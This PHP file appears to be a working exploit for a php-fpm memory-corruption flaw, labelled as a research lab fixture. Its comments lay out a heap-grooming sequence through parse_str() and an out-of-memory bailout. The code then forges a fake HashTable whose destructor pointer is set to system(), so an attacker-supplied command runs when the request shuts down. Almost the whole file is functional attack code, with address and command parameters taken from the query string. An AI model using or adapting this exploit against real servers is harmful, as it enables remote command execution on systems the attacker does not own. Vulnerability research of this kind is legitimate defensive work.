<?php
// CVE-2026-109618 - script-stage forge variant for php-fpm.
//
// mod_php exploit (hit.php): startup POST-parse OOM -> request shutdown runs
// unconditionally -> stale bucket in $_POST -> fake HashTable pDestructor.
// fpm BLOCKS that path: startup OOM kills the child (exit 70), no shutdown.
//
// This variant moves the identical allocation dance into the SCRIPT stage,
// where fpm's shutdown provably runs after a bailout (gassoc leak works in
// fpm, 26/26).  parse_str() routes through php_default_treat_data() with
// PARSE_STRING - the same register_variable_ex insert path as the POST
// parser - so the 288-byte dance ("=<288B>&a=1&Z..Z[x]=1") reproduces
// byte-exactly:
//   '=' + 288B pattern   -> empty-name value alloc + release (320 class)
//   'a=1'                -> $out arData (288B) reuses the freed block
//   'Z'*n . '[x]=1'      -> nNumUsed++ then OOM on the huge key
//                         -> bailout -> shutdown destroys $out with the
//                            stale trigger bucket -> fake table destroy
//                            -> pDestructor = system(cmd)
//
// Unlike the POST body (raw bytes, ~17% urldecode damage), the pattern is
// rawurlencode()'d here and decodes back byte-exactly -> deterministic.
//
// Parameters (GET):
//   p0    arData - pattern_base (calibrated, gdb probe)
//   a     arData absolute address (decimal)
//   s     pDestructor = system address (decimal)
//   c     command, hex-encoded (<= 23 bytes with this bucket overlay; the
//         fake Bucket's key pointer begins at byte 24 and is written NULL)
//   n     huge-key length in bytes (drives the OOM)
//   t     1 = write through the global $out reference (PHP <= 8.4.26);
//         2 = pop/release one value then write through (PHP 8.5.11 profile);
//         3 = diagnostic two-pop variant; 0 = no trigger
//   gc    fake HashTable initial GC refcount; the verified PHP 8.5.11 profile
//         uses t=2 and gc=0 so the popped fake array reaches its destructor.
//   probe 1 = SELFREF-tagged pattern for gdb calibration (no forging)
//
// Lab fixture for authorized CVE research only.
// This file is the pinned source used by tests/fpm_eol_matrix.py; keep the
// legacy forge.php entrypoint for old evidence replay.
$g = $_GET;
$p0    = (int)$g['p0'];
$n     = (int)$g['n'];
$probe = !empty($g['probe']);
$dry   = !empty($g['dry']);
$fakeGcRefcount = isset($g['gc']) ? (int)$g['gc'] : 1;
$triggerSlots = isset($g['slots']) ? (int)$g['slots'] : 4;
$triggerBucket = isset($g['slot']) ? (int)$g['slot'] : 0;
if ($triggerSlots < 1 || $triggerSlots > 4 || $triggerBucket < 0
    || $triggerBucket + $triggerSlots > 4) {
    echo "BAD_TRIGGER_SHAPE";
    exit;
}

$buf = str_repeat("\x41", 288);
// exploit mode: offsets are arData-relative -> shifted by p0; probe mode:
// tags sit at absolute pattern offsets (same as selfref probe_pattern)
$shift = $probe ? 0 : $p0;
$put = function (int $off, string $data) use (&$buf, $shift): void {
    $o = $off + $shift;
    if ($o < 0 || $o + strlen($data) > 288) {
        echo "OVF@0x" . dechex($o);
        exit;
    }
    for ($i = 0; $i < strlen($data); $i++) {
        $buf[$o + $i] = $data[$i];
    }
};

if ($probe) {
    for ($i = 0; $i < 9; $i++) {
        $put(24 + 32 * $i, "SELFREF$i");
    }
} else {
    $ard = (int)$g['a'];                 // arData absolute
    $sys = (int)$g['s'];                 // system()
    $cmd = pack("H*", $g['c']);
    for ($b = 0; $b < 4; $b++) {         // trigger zvals, buckets 0..3
        $active = $b >= $triggerBucket && $b < $triggerBucket + $triggerSlots;
        // Older x86_64 glibc builds can fault when the same fake array is
        // reached twice from the stale outer buckets.  The single-slot
        // profile leaves bucket1 as the only refcounted trigger and clears
        // the other bucket's value/type so the fake destructor runs once.
        $put(32 * $b, pack("P", $active ? $ard + 0x80 : 0));
        // The dry calibration keeps the bucket layout and serialized field
        // sizes identical, but clears IS_TYPE_REFCOUNTED so the fake array
        // destructor cannot run. It is used only to measure this exact GET
        // shape before the corresponding live attack request.
        $put(32 * $b + 8, pack("V", ($active && !$dry) ? 0x107 : 0x07));
    }
    $put(0x80, pack("V", $fakeGcRefcount)); // fake zend_array @ arData+0x80:
    $put(0x84, pack("V", 7));            //   gc.type_info = IS_ARRAY
    $put(0x88, pack("V", 0));            //   u.flags
    $put(0x8C, pack("V", 0));            //   nTableMask
    $put(0x90, pack("P", $ard + 0xC0));  //   arData -> fake bucket
    $put(0x98, pack("V", 1));            //   nNumUsed
    $put(0x9C, pack("V", 1));            //   nNumOfElements
    $put(0xA0, pack("V", 8));            //   nTableSize
    $put(0xA4, pack("V", 0));            //   nInternalPointer
    $put(0xA8, pack("P", 0));            //   nNextFreeElement
    $put(0xB0, pack("P", $sys));         //   pDestructor = system
    // Bucket prefix bytes 0..23 are zval + hash; the key pointer is at +24.
    $put(0xC0, str_pad($cmd, 24, "\0")); // fake Bucket's command prefix
    // clean-destroy hygiene: NULL out both keys the walk will meet, so the
    // destroy completes without a bogus zend_string_release after system().
    // (put() adds p0: 0x38+0x40 = pattern+0x78 = $out bucket1.key,
    //  0xD8+0x40 = pattern+0x118 = fake bucket.key)
    $put(0x38, pack("P", 0));            // $out bucket1.key = NULL
    $put(0xD8, pack("P", 0));            // fake bucket.key = NULL
}

// parse_str(&$result) makes $out a REFERENCE; after the OOM bailout the dead
// frame's arg slot still
// owns the ref wrapper (rc 2), so unset($GLOBALS['out']) only drops the
// CV-side ownership (2->1) and the array is NEVER destroyed - the stale
// trigger bucket is never walked (gtest S5: no DESTRUCT).  ASSIGN through
// $GLOBALS takes FETCH_W -> ASSIGN, which writes THROUGH the ref wrapper
// and dtors the old array (rc 1->0 -> full bucket walk -> trigger)
// The assignment through $GLOBALS is what releases the array and reaches the
// stale bucket during shutdown.
$t = isset($g['t']) ? (int)$g['t'] : 0;
if ($t) {
    register_shutdown_function(function () use ($t) {
        @file_put_contents('/tmp/f.log', "SDFN enter\n", FILE_APPEND);
        if (isset($GLOBALS['out'])) {
            @file_put_contents('/tmp/f.log', "SDFN out isset\n",
                               FILE_APPEND);
            if ($t >= 2) {
                // PHP 8.5.11 diagnostic mode: pop the final used bucket and
                // release the returned zval explicitly. This tests whether
                // the stale bucket can be reached even when the bailout
                // frame retains an extra HashTable reference.
                $pop_count = $t >= 3 ? 2 : 1;
                for ($i = 0; $i < $pop_count; $i++) {
                    $discard = array_pop($GLOBALS['out']);
                    @file_put_contents('/tmp/f.log', "SDFN pop done\n",
                                       FILE_APPEND);
                    unset($discard);
                    @file_put_contents('/tmp/f.log', "SDFN pop value released\n",
                                       FILE_APPEND);
                }
            }
            $GLOBALS['out'] = 0;   // write-through ref: destroy + walk
            @file_put_contents('/tmp/f.log', "SDFN assign done\n",
                               FILE_APPEND);
            unset($GLOBALS['out']);
            @file_put_contents('/tmp/f.log', "SDFN unset done\n",
                               FILE_APPEND);
        } else {
            @file_put_contents('/tmp/f.log', "SDFN out MISSING\n",
                               FILE_APPEND);
        }
    });
}

// Build the query exactly like the POST exploit body.  rawurlencode makes
// the field structure deterministic; parse_str decodes the pattern back
// byte-exactly.  unset($put) first: the closure holds &$buf by reference,
// so without this $buf survives and shifts the whole 320-class free list.
// $huge must be built BEFORE unset($buf), obviously.
$huge = "=" . rawurlencode($buf) . "&a=1&" . str_repeat("Z", $n) . "[x]=1";
unset($put);
unset($buf);
echo "BUILD_OK\n";
flush();
parse_str($huge, $out);
echo "NO_OOM usage=" . memory_get_peak_usage(true);
